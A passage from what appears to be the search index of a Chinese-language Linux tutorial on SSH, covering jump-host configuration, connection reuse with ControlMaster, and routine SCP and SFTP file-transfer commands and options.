<p>\u200b\u5982\u679c\u200b\u8981\u200b\u7ed9\u200b\u8df3\u677f\u200b\u673a\u200b\u8bbe\u7f6e\u200b\u66f4\u200b\u591a\u200b\u53c2\u6570\u200b\uff0c\u200b\u5982\u200b\u7aef\u53e3\u200b\u7b49\u200b\uff0c\u200b\u5219\u200b\u5fc5\u987b\u200b\u4f7f\u7528\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff1a</p> <pre><code>Host jumphost\n  HostName jumphost.example.com\n  User jumphostuser\n  Port 2333\n\nHost realhost\n  HostName realhost.example.com\n  User realhostuser\n  ProxyJump jumphost\n</code></pre> <p>\u200b\u8df3\u677f\u200b\u673a\u200b\u9700\u8981\u200b\u652f\u6301\u200b TCP \u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b</p> <p>SSH \u200b\u8df3\u677f\u200b\u673a\u548c\u524d\u200b\u6587\u200b\u6240\u8ff0\u200b\u7684\u200b\u201c\u200b\u672c\u5730\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u201d\u200b\u91c7\u7528\u200b\u76f8\u540c\u200b\u7684\u200b\u6280\u672f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8df3\u677f\u200b\u673a\u200b\u9700\u8981\u200b\u5141\u8bb8\u200b TCP \u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u5f00\u542f\u200b\uff09\u3002</p>"},{"location":"dev/ssh/#connection-reuse","title":"\u9ad8\u7ea7\u200b\u529f\u80fd\u200b\uff1a\u200b\u8fde\u63a5\u200b\u590d\u7528","text":"<p>SSH \u200b\u534f\u8bae\u200b\u5141\u8bb8\u200b\u5728\u200b\u4e00\u6761\u200b\u8fde\u63a5\u200b\u5185\u200b\u8fd0\u884c\u200b\u591a\u4e2a\u200b channel\uff0c\u200b\u5176\u4e2d\u200b\u6bcf\u4e2a\u200b channel \u200b\u53ef\u4ee5\u200b\u662f\u200b\u4e00\u4e2a\u200b shell session\u3001\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u3001scp \u200b\u547d\u4ee4\u200b\u7b49\u200b\u3002OpenSSH \u200b\u652f\u6301\u200b\u8fde\u63a5\u200b\u590d\u7528\u200b\uff0c\u200b\u5373\u200b\u4e00\u4e2a\u200b SSH \u200b\u8fdb\u7a0b\u200b\u5728\u200b\u540e\u53f0\u200b\u4fdd\u6301\u200b\u8fde\u63a5\u200b\uff08\u200b\u79f0\u4e3a\u200b master \u200b\u8fdb\u7a0b\u200b\uff09\uff0c\u200b\u5176\u4ed6\u200b\u5ba2\u6237\u7aef\u200b\u5728\u200b\u8fde\u63a5\u200b\u540c\u4e00\u4e2a\u200b\u4e3b\u673a\u200b\u65f6\u200b\u53ef\u4ee5\u200b\u590d\u7528\u200b\u8fd9\u4e2a\u200b\u8fde\u63a5\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u9700\u8981\u200b\u91cd\u65b0\u200b\u63e1\u624b\u200b\u8ba4\u8bc1\u200b\u7b49\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u663e\u8457\u200b\u51cf\u5c11\u200b\u8fde\u63a5\u65f6\u95f4\u200b\u3002\u200b\u8fd9\u200b\u5728\u200b\u9891\u7e41\u200b\u8fde\u63a5\u200b\u540c\u4e00\u4e2a\u200b\u4e3b\u673a\u200b\u65f6\u200b\u975e\u5e38\u200b\u6709\u7528\u200b\uff0c\u200b\u5c24\u5176\u200b\u662f\u200b\u5f53\u200b\u4e3b\u673a\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u8f83\u5927\u200b\u3001\u200b\u5e38\u7528\u200b\u64cd\u4f5c\u200b\u6240\u200b\u9700\u200b\u7684\u200b RTT \u200b\u8f83\u591a\u65f6\u200b\uff08\u200b\u4f8b\u5982\u200b\u4ece\u200b GitHub \u200b\u62c9\u53d6\u200b\u4ed3\u5e93\u200b\uff0c\u200b\u6216\u8005\u200b\u524d\u200b\u6587\u200b\u6240\u8ff0\u200b\u7684\u200b\u8df3\u677f\u200b\u673a\u200b\u4f7f\u7528\u200b\u65b9\u5f0f\u200b\uff09\u3002</p> <p>\u200b\u542f\u7528\u200b\u8fde\u63a5\u200b\u590d\u7528\u200b\u9700\u8981\u200b\u5728\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u540c\u65f6\u200b\u6307\u5b9a\u200b <code>ControlMaster</code>\u3001<code>ControlPath</code> \u200b\u548c\u200b <code>ControlPersist</code> \u200b\u4e09\u4e2a\u200b\u9009\u9879\u200b\uff08\u200b\u5b83\u4eec\u200b\u7684\u200b\u9ed8\u8ba4\u503c\u200b\u90fd\u200b\u662f\u200b\u7981\u7528\u200b\u6216\u8005\u200b\u5f88\u200b\u4e0d\u200b\u53cb\u597d\u200b\u7684\u200b\u503c\u200b\uff09\uff1a</p> <pre><code>Host *\n  ControlMaster auto\n  ControlPath /tmp/sshcontrol-%C\n  ControlPersist yes\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>%C</code> \u200b\u662f\u200b <code>%l%h%p%r</code> \u200b\u7684\u200b hash\uff0c\u200b\u56e0\u6b64\u200b\u8fde\u63a5\u200b\u4e0d\u540c\u200b\u4e3b\u673a\u200b\u7684\u200b control socket \u200b\u4e0d\u4f1a\u200b\u51b2\u7a81\u200b\u3002</p> <p>\u200b\u8fde\u63a5\u200b\u590d\u7528\u200b\u7684\u200b\u6807\u8bc6\u7b26\u200b</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u5c1d\u8bd5\u200b\u7528\u200b\u76f8\u540c\u200b\u7684\u200b\u7528\u6237\u540d\u200b\u548c\u200b\u4e0d\u540c\u200b\u7684\u200b\u516c\u94a5\u200b\u8fde\u63a5\u200b\u540c\u4e00\u4e2a\u200b\u76ee\u6807\u200b\uff08\u200b\u4f8b\u5982\u200b <code>git@github.com</code>\uff09\uff0c\u200b\u7531\u4e8e\u200b\u6ca1\u6709\u200b\u65b0\u5efa\u200b\u8fde\u63a5\u200b\u7684\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u4f60\u200b\u6307\u5b9a\u200b\u7684\u200b\u516c\u94a5\u200b\u5e76\u200b\u4e0d\u4f1a\u200b\u751f\u6548\u200b\u3002 \u200b\u89e3\u51b3\u200b\u6b64\u200b\u95ee\u9898\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\u518d\u200b\u5355\u72ec\u200b\u6307\u5b9a\u200b\u53e6\u200b\u4e00\u4e2a\u200b <code>ControlPath</code>\uff0c\u200b\u6216\u8005\u200b\u8bbe\u7f6e\u200b <code>ControlPath=none</code> \u200b\u6682\u65f6\u200b\u7981\u7528\u200b\u8fde\u63a5\u200b\u590d\u7528\u200b\u529f\u80fd\u200b\u3002</p> <p>\u200b\u8fde\u63a5\u200b\u590d\u7528\u200b\u65f6\u200b\u7684\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b</p> <p>\u200b\u5f53\u200b\u542f\u7528\u200b\u8fde\u63a5\u200b\u590d\u7528\u200b\u65f6\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u7b49\u200b SSH \u200b\u8fde\u63a5\u200b\u7279\u6027\u200b\u90fd\u200b\u5c06\u200b\u7531\u200b master \u200b\u8fdb\u7a0b\u200b\u7ba1\u7406\u200b\uff0c\u200b\u6b64\u65f6\u200b\u65b0\u200b\u7684\u200b <code>ssh &lt;host&gt; -L &lt;forwarding&gt;</code> \u200b\u4f1a\u200b\u5c06\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u8bf7\u6c42\u200b\u53d1\u9001\u7ed9\u200b master \u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u5e76\u200b\u5728\u200b\u5f53\u524d\u200b ssh \u200b\u547d\u4ee4\u200b\u7ed3\u675f\u200b\u540e\u200b\u6301\u7eed\u200b\u8f6c\u53d1\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>ssh host # do something\nssh host -L &lt;forwarding_1&gt;\nssh host -R &lt;forwarding_2&gt;\n</code></pre> <p>\u200b\u5728\u200b\u4ee5\u4e0a\u200b\u6240\u6709\u200b ssh \u200b\u547d\u4ee4\u200b\u90fd\u200b\u9000\u51fa\u200b\u540e\u200b\uff0c<code>forwarding_1</code> \u200b\u548c\u200b <code>forwarding_2</code> \u200b\u5c06\u200b\u4ecd\u7136\u200b\u5728\u200b\u540e\u53f0\u200b\u6301\u7eed\u200b\u8fdb\u884c\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u3002</p> <p>\u200b\u82e5\u200b\u8981\u200b\u505c\u6b62\u200b\u8fd9\u4e9b\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>~C</code> \u200b\u547d\u4ee4\u200b\u6216\u200b <code>-O</code> \u200b\u6307\u4ee4\u200b\uff08\u200b\u89c1\u200b\u4e0b\u200b\uff09\u200b\u4f7f\u200b\u540e\u53f0\u200b\u7684\u200b master \u200b\u8fdb\u7a0b\u200b\u505c\u6b62\u200b\u8fdb\u884c\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u3002</p> <p>\u200b\u542f\u7528\u200b\u8fde\u63a5\u200b\u590d\u7528\u200b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>ssh &lt;host&gt; -O &lt;command&gt;</code> \u200b\u7684\u200b\u65b9\u5f0f\u200b\u5411\u200b\u540e\u53f0\u200b\u76d1\u542c\u200b\u65b0\u200b\u8fde\u63a5\u200b\u7684\u200b master \u200b\u8fdb\u7a0b\u200b\u53d1\u9001\u200b\u4e00\u4e9b\u200b\u63a7\u5236\u6307\u4ee4\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li><code>ssh host -O exit</code> \u200b\u53ef\u4ee5\u200b\u4f7f\u200b master \u200b\u8fdb\u7a0b\u200b\u9000\u51fa\u200b\uff0c\u200b\u540e\u7eed\u200b\u7684\u200b <code>ssh host</code> \u200b\u547d\u4ee4\u200b\u5c06\u200b\u91cd\u65b0\u200b\u5efa\u7acb\u200b\u8fde\u63a5\u200b\u3002</li> <li><code>ssh host -O cancel</code> \u200b\u53ef\u4ee5\u200b\u5728\u200b\u4fdd\u6301\u200b\u7684\u200b\u540e\u53f0\u200b\u8fde\u63a5\u200b\u4e2d\u200b\u53d6\u6d88\u200b\u6240\u6709\u200b\u7684\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u3002</li> </ul>"},{"location":"dev/ssh/#file-transfer","title":"\u6587\u4ef6\u4f20\u8f93","text":"<p>SFTP\uff08Secure File Transfer Protocol\uff09\u200b\u548c\u200b SCP\uff08Secure Copy Protocol\uff09\u200b\u90fd\u200b\u662f\u200b\u57fa\u4e8e\u200b SSH \u200b\u7684\u200b\u53e6\u200b\u4e00\u79cd\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u5de5\u5177\u200b\uff0c\u200b\u5b83\u200b\u7528\u4e8e\u200b\u5728\u200b\u672c\u5730\u200b\u548c\u200b\u8fdc\u7a0b\u200b\u7cfb\u7edf\u200b\u4e4b\u95f4\u200b\u5b89\u5168\u200b\u5730\u200b\u590d\u5236\u200b\u6587\u4ef6\u200b\u3002SCP \u200b\u529f\u80fd\u200b\u76f8\u5bf9\u200b\u7b80\u5355\u200b\uff0c\u200b\u4e3b\u8981\u200b\u63d0\u4f9b\u200b\u6587\u4ef6\u200b\u7684\u200b\u590d\u5236\u200b\u529f\u80fd\u200b\u3002SFTP \u200b\u662f\u200b\u4e00\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u5efa\u7acb\u200b\u5728\u200b SSH \u200b\u4e4b\u4e0a\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u4ea4\u4e92\u5f0f\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u4f1a\u8bdd\u200b\u548c\u200b\u66f4\u200b\u4e30\u5bcc\u200b\u7684\u200b\u6587\u4ef6\u200b\u64cd\u4f5c\u200b\u529f\u80fd\u200b\uff0c\u200b\u5305\u62ec\u200b\u5bf9\u200b\u6587\u4ef6\u200b\u7684\u200b\u6d4f\u89c8\u200b\u3001\u200b\u7f16\u8f91\u200b\u548c\u200b\u7ba1\u7406\u200b\u3002</p> <p>Rsync</p> <p>SCP \u200b\u548c\u200b SFTP \u200b\u80fd\u591f\u200b\u63d0\u4f9b\u200b\u7684\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u529f\u80fd\u200b\u8f83\u4e3a\u200b\u57fa\u7840\u200b\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u9700\u8981\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f8b\u5982\u200b\u589e\u91cf\u200b\u4f20\u8f93\u200b\u3001\u200b\u65ad\u70b9\u7eed\u4f20\u200b\u3001\u200b\u6587\u4ef6\u200b\u6821\u9a8c\u200b\u7b49\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b Rsync\u3002Rsync \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b SSH \u200b\u4f5c\u4e3a\u200b\u4f20\u8f93\u5c42\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u66ff\u4ee3\u200b <code>scp</code> \u200b\u547d\u4ee4\u200b\u3002</p> <p>\u200b\u8be6\u60c5\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u672c\u200b\u6559\u7a0b\u200b\u5173\u4e8e\u200b Rsync \u200b\u7684\u200b\u7ae0\u8282\u200b\u3002</p>"},{"location":"dev/ssh/#scp","title":"SCP","text":"<p>SCP \u200b\u662f\u200b\u57fa\u4e8e\u200b SSH (Secure Shell) \u200b\u534f\u8bae\u200b\u7684\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u5de5\u5177\u200b\uff0c\u200b\u5b83\u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u5728\u200b\u672c\u5730\u200b\u548c\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u4e4b\u95f4\u200b\u5b89\u5168\u200b\u5730\u200b\u590d\u5236\u200b\u6587\u4ef6\u200b\u3002SCP \u200b\u4f7f\u7528\u200b SSH \u200b\u8fdb\u884c\u200b\u6570\u636e\u4f20\u8f93\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u540c\u200b SSH \u200b\u76f8\u540c\u200b\u7ea7\u522b\u200b\u7684\u200b\u5b89\u5168\u6027\u200b\uff0c\u200b\u5305\u62ec\u200b\u6570\u636e\u200b\u52a0\u5bc6\u200b\u548c\u200b\u7528\u6237\u200b\u8ba4\u8bc1\u200b\u3002</p> <p>SCP \u200b\u547d\u4ee4\u200b\u7684\u200b\u57fa\u672c\u200b\u8bed\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>scp [\u200b\u9009\u9879\u200b] [\u200b\u6e90\u6587\u4ef6\u200b] [\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b]\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\uff0c\u200b\u6e90\u6587\u4ef6\u200b\u6216\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b\u7684\u200b\u683c\u5f0f\u200b\u53ef\u4ee5\u200b\u662f\u200b\u672c\u5730\u200b\u8def\u5f84\u200b\uff0c\u200b\u6216\u8005\u200b\u8fdc\u7a0b\u200b\u8def\u5f84\u200b\uff0c\u200b\u5982\u200b <code>\u200b\u7528\u6237\u540d\u200b@\u200b\u4e3b\u673a\u540d\u200b:\u200b\u6587\u4ef6\u200b\u8def\u5f84\u200b</code>\u3002</p>"},{"location":"dev/ssh/#scp-files","title":"\u6587\u4ef6\u200b\u590d\u5236","text":"<p>\u200b\u4ece\u200b\u672c\u5730\u200b\u590d\u5236\u5230\u200b\u8fdc\u7a0b\u200b\u670d\u52a1\u5668\u200b</p> <pre><code>scp /path/to/local/file username@remotehost:/path/to/remote/directory\n</code></pre> <p>\u200b\u6216\u200b\u4ece\u200b\u8fdc\u7a0b\u200b\u670d\u52a1\u5668\u200b\u590d\u5236\u5230\u200b\u672c\u5730\u200b</p> <pre><code>scp username@remotehost:/path/to/remote/file /path/to/local/directory\n</code></pre> <p>\u200b\u8fd9\u4e2a\u200b\u547d\u4ee4\u200b\u4f1a\u200b\u63d0\u793a\u200b\u60a8\u200b\u8f93\u5165\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\uff0c\u200b\u9664\u975e\u200b\u60a8\u200b\u5df2\u7ecf\u200b\u8bbe\u7f6e\u200b\u4e86\u200b SSH \u200b\u5bc6\u94a5\u200b\u8ba4\u8bc1\u200b\u3002</p> <p>Tip</p> <p>\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u4e00\u6b21\u6027\u200b\u4f20\u8f93\u200b\u591a\u4e2a\u200b\u6587\u4ef6\u200b\u6216\u200b\u76ee\u5f55\u200b\uff0c\u200b\u5c06\u200b\u5b83\u4eec\u200b\u4f5c\u4e3a\u200b\u6e90\u200b\u8def\u5f84\u200b\u7684\u200b\u53c2\u6570\u200b\u3002\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>scp file1.txt file2.txt username@remotehost:/path/to/remote/directory\n</code></pre> <p>\u200b\u6216\u8005\u200b\u7ecf\u8fc7\u200b\u672c\u5730\u200b\u6d41\u91cf\u200b\u4e2d\u8f6c\u200b\uff0c\u200b\u5728\u200b\u4e24\u4e2a\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u4e4b\u95f4\u200b\u590d\u5236\u200b\u6587\u4ef6\u200b</p> <pre><code>scp username1@remotehost1:/path/to/remote/file username2@remotehost2:/path/to/remote/directory\n</code></pre>"},{"location":"dev/ssh/#scp-parameters","title":"\u5e38\u7528\u200b\u53c2\u6570","text":"\u590d\u5236\u200b\u76ee\u5f55\u200b <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u590d\u5236\u200b\u6574\u4e2a\u200b\u76ee\u5f55\u200b\uff0c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>-r</code> \u200b\u9009\u9879\u200b\uff0c\u200b\u8fd9\u200b\u8868\u793a\u200b\u9012\u5f52\u200b\u590d\u5236\u200b\uff1a</p> <pre><code>scp -r /path/to/local/directory username@remotehost:/path/to/remote/directory\n</code></pre> \u200b\u4f7f\u7528\u200b\u975e\u6807\u51c6\u200b\u7aef\u53e3\u200b <p>\u200b\u5982\u679c\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\u7684\u200b SSH \u200b\u670d\u52a1\u200b\u8fd0\u884c\u200b\u5728\u200b\u975e\u6807\u51c6\u200b\u7aef\u53e3\u200b\uff0822\uff09\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-P</code> \u200b\u9009\u9879\u200b\u6307\u5b9a\u200b\u7aef\u53e3\u200b\uff1a</p> <pre><code>scp -P 2222 /path/to/local/file username@remotehost:/path/to/remote/directory\n</code></pre> <p>Tip</p> <p>\u200b\u4f60\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b SSH \u200b\u5ba2\u6237\u7aef\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u4e3a\u200b <code>Host remotehost</code> \u200b\u6307\u5b9a\u200b <code>Port 2222</code>\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u6bcf\u6b21\u200b\u5728\u200b\u547d\u4ee4\u884c\u200b\u4e2d\u200b\u6307\u5b9a\u200b\u7aef\u53e3\u200b\u4e86\u200b\u3002</p> \u200b\u9650\u5236\u200b\u5e26\u5bbd\u200b <p>\u200b\u4f7f\u7528\u200b <code>-l</code> \u200b\u9009\u9879\u200b\u53ef\u4ee5\u200b\u9650\u5236\u200b SCP \u200b\u4f7f\u7528\u200b\u7684\u200b\u5e26\u5bbd\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b <code>Kbit/s</code>\uff1a</p> <pre><code>scp -l 1024 /path/to/local/file username@remotehost:/path/to/remote/directory\n</code></pre> \u200b\u4fdd\u7559\u200b\u6587\u4ef6\u5c5e\u6027\u200b <p><code>-p</code> \u200b\u9009\u9879\u200b\u53ef\u4ee5\u200b\u4fdd\u7559\u200b\u539f\u6587\u4ef6\u200b\u7684\u200b\u4fee\u6539\u200b\u65f6\u95f4\u200b\u548c\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b\uff1a</p> <pre><code>scp -p /path/to/local/file username@remotehost:/path/to/remote/directory\n</code></pre> \u200b\u5f00\u542f\u200b\u538b\u7f29\u200b <p>\u200b\u4f7f\u7528\u200b <code>-C</code> \u200b\u9009\u9879\u200b\u5f00\u542f\u200b\u538b\u7f29\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b\u4f20\u8f93\u6570\u636e\u200b\u91cf\u200b\u5e76\u200b\u63d0\u5347\u200b\u4f20\u8f93\u901f\u5ea6\u200b\uff0c\u200b\u7279\u522b\u200b\u5bf9\u4e8e\u200b\u6587\u672c\u6587\u4ef6\u200b\u6548\u679c\u663e\u8457\u200b\u3002</p> <pre><code>scp -C /path/to/local/file username@remotehost:/path/to/remote/directory\n</code></pre> <p>Tip</p> <p>\u200b\u6b64\u200b\u9009\u9879\u200b\u7b49\u4ef7\u200b\u4e8e\u200b <code>ssh</code> \u200b\u7684\u200b <code>-C</code> \u200b\u9009\u9879\u200b\uff0c\u200b\u5373\u200b\u5728\u200b SSH \u200b\u5c42\u9762\u200b\u5f00\u542f\u200b\u538b\u7f29\u200b\uff0c\u200b\u5e76\u975e\u200b SCP \u200b\u534f\u8bae\u200b\u5c42\u9762\u200b\u7684\u200b\u538b\u7f29\u200b\u3002</p> <p>\u200b\u4f60\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b SSH \u200b\u5ba2\u6237\u7aef\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u4e3a\u200b <code>Host remotehost</code> \u200b\u6307\u5b9a\u200b <code>Compression yes</code>\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u6bcf\u6b21\u200b\u5728\u200b\u547d\u4ee4\u884c\u200b\u4e2d\u200b\u542f\u7528\u200b\u538b\u7f29\u200b\u4e86\u200b\u3002</p> <p>\u200b\u73b0\u4ee3\u200b\u7684\u200b <code>scp</code> \u200b\u547d\u4ee4\u200b\u5df2\u7ecf\u200b\u9ed8\u8ba4\u200b\u4f7f\u7528\u200b SFTP \u200b\u534f\u8bae\u200b</p> <p>\u200b\u4ece\u200b OpenSSH 9.0 \u200b\u5f00\u59cb\u200b\uff0c<code>scp</code> \u200b\u547d\u4ee4\u200b\u5df2\u7ecf\u200b\u9ed8\u8ba4\u200b\u4f7f\u7528\u200b SFTP \u200b\u534f\u8bae\u200b\u8fdb\u884c\u200b\u6587\u4ef6\u4f20\u8f93\u200b\uff0c\u200b\u800c\u200b\u4e0d\u518d\u200b\u4f7f\u7528\u200b\u65e7\u200b\u7684\u200b SCP \u200b\u534f\u8bae\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u4e00\u4e9b\u200b\u4e0d\u200b\u652f\u6301\u200b SFTP \u200b\u7684\u200b\u8fdc\u7a0b\u200b\u4e3b\u673a\u200b\uff08\u200b\u5982\u200b\u4f7f\u7528\u200b dropbear \u200b\u7684\u200b\u5d4c\u5165\u5f0f\u200b\u8bbe\u5907\u200b\u6216\u200b\u4e0a\u53e4\u200b\u7248\u672c\u200b\u7684\u200b SSH \u200b\u670d\u52a1\u7aef\u200b\u7b49\u200b\uff09\uff0c\u200b\u8fd9\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>/usr/libexec/sftp-server: No such file or directory\n</code></pre> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u65e7\u200b\u7684\u200b SCP \u200b\u534f\u8bae\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-O</code> \u200b\u9009\u9879\u200b\uff1a</p> <pre><code>scp -O /path/to/local/file username@remotehost:/path/to/remote/directory\n</code></pre>"},{"location":"dev/ssh/#sftp","title":"SFTP","text":"<p>SFTP \u200b\u662f\u200b\u4e00\u79cd\u200b\u5b89\u5168\u200b\u7684\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u534f\u8bae\u200b\uff0c\u200b\u5b83\u200b\u5728\u200b SSH \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6269\u5c55\u200b\u7684\u200b\u529f\u80fd\u200b\u96c6\u5408\u200b\uff0c\u200b\u7528\u4e8e\u200b\u6587\u4ef6\u200b\u8bbf\u95ee\u200b\u3001\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u548c\u200b\u6587\u4ef6\u200b\u7ba1\u7406\u200b\u3002\u200b\u4e0e\u200b SCP \u200b\u76f8\u6bd4\u200b\uff0cSFTP \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u66f4\u200b\u4e30\u5bcc\u200b\u7684\u200b\u64cd\u4f5c\u200b\u6587\u4ef6\u200b\u548c\u200b\u76ee\u5f55\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5217\u51fa\u200b\u76ee\u5f55\u200b\u5185\u5bb9\u200b\u3001\u200b\u5220\u9664\u200b\u6587\u4ef6\u200b\u3001\u200b\u521b\u5efa\u200b\u548c\u200b\u5220\u9664\u200b\u76ee\u5f55\u200b\u7b49\u200b\u3002\u200b\u7531\u4e8e\u200b SFTP \u200b\u5728\u200b\u4f20\u8f93\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u4f7f\u7528\u200b SSH \u200b\u63d0\u4f9b\u200b\u7684\u200b\u52a0\u5bc6\u200b\u901a\u9053\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5b83\u200b\u80fd\u591f\u200b\u4fdd\u8bc1\u6570\u636e\u200b\u7684\u200b\u5b89\u5168\u6027\u200b\u548c\u200b\u9690\u79c1\u200b\u6027\u200b\u3002</p>"},{"location":"dev/ssh/#start-sftp","title":"\u542f\u52a8\u200b SFTP \u200b\u4f1a\u8bdd","text":"<p>\u200b\u8981\u200b\u8fde\u63a5\u200b\u5230\u200b\u8fdc\u7a0b\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>sftp username@remotehost\n</code></pre> <p>\u200b\u5982\u679c\u200b\u8fdc\u7a0b\u200b\u670d\u52a1\u5668\u200b\u7684\u200b SSH \u200b\u670d\u52a1\u200b\u4f7f\u7528\u200b\u7684\u200b\u4e0d\u662f\u200b\u9ed8\u8ba4\u200b\u7aef\u53e3\u200b\uff0822\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-P</code> \u200b\u9009\u9879\u200b\u6307\u5b9a\u200b\u7aef\u53e3\u200b\uff1a</p> <pre><code>sftp -P 2233 username@remotehost\n</code></pre>"},{"location":"dev/ssh/#sftp-operations","title":"\u6587\u4ef6\u200b\u548c\u200b\u76ee\u5f55\u200b\u64cd\u4f5c","text":"<ul> <li><code>ls</code>\uff1a\u200b\u5217\u51fa\u200b\u8fdc\u7a0b\u200b\u76ee\u5f55\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</li> <li><code>get remote-file [local-file]</code>\uff1a\u200b\u4e0b\u8f7d\u200b\u6587\u4ef6\u200b\u3002</li> <li><code>put local-file [remote-file]</code>\uff1a\u200b\u4e0a\u4f20\u200b\u6587\u4ef6\u200b\u3002</li> <li><code>mkdir directory-name</code>\uff1a\u200b\u521b\u5efa\u200b\u8fdc\u7a0b\u200b\u76ee\u5f55\u200b\u3002</li> <li><code>rmdir directory-name</code>\uff1a\u200b\u5220\u9664\u200b\u8fdc\u7a0b\u200b\u76ee\u5f55\u200b\u3002</li> <li><code>rm file-name</code>\uff1a\u200b\u5220\u9664\u200b\u8fdc\u7a0b\u200b\u6587\u4ef6\u200b\u3002</li> <li><code>chmod mode file-name</code>\uff1a\u200b\u6539\u53d8\u200b\u8fdc\u7a0b\u200b\u6587\u4ef6\u200b\u7684\u200b\u6743\u9650\u200b\u3002</li> <li><code>pwd</code>\uff1a\u200b\u663e\u793a\u200b\u5f53\u524d\u200b\u8fdc\u7a0b\u200b\u76ee\u5f55\u200b\u3002</li> <li><code>lpwd</code>\uff1a\u200b\u663e\u793a\u200b\u5f53\u524d\u200b\u672c\u5730\u200b\u76ee\u5f55\u200b\u3002</li> <li><code>cd directory-name</code>\uff1a\u200b\u6539\u53d8\u200b\u8fdc\u7a0b\u200b\u5de5\u4f5c\u200b\u76ee\u5f55\u200b\u3002</li> <li><code>lcd 